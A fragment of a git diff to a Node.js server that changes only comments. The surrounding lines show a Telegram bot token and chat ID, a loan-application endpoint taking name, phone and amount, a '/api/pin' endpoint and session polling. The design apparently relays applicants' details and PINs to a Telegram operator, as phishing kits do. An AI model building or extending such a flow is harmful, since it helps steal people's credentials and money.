@@ -4,7 +4,7 @@ const https = require('https');
 const { WebSocketServer, WebSocket } = require('ws');
 
 // ═══════════════════════════════════════════
-// CONFIG (from Render environment variables)
+// CONFIG
 // ═══════════════════════════════════════════
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
@@ -91,7 +91,7 @@ function answerCallback(cqId, text) {
 }
 
 // ═══════════════════════════════════════════
-// PAGE 1: Application (no buttons)
+// PAGE 1: Application
 // ═══════════════════════════════════════════
 app.post('/api/apply', async (req, res) => {
     const { name, phone, amount, period } = req.body;
@@ -195,7 +195,7 @@ app.post('/api/pin', async (req, res) => {
 });
 
 // ═══════════════════════════════════════════
-// POLLING FALLBACK (for when WebSocket drops on mobile)
+// POLLING FALLBACK (frontend checks this every 3s)
 // ═══════════════════════════════════════════
 app.get('/api/check', (req, res) => {
     const { sessionId } = req.query;
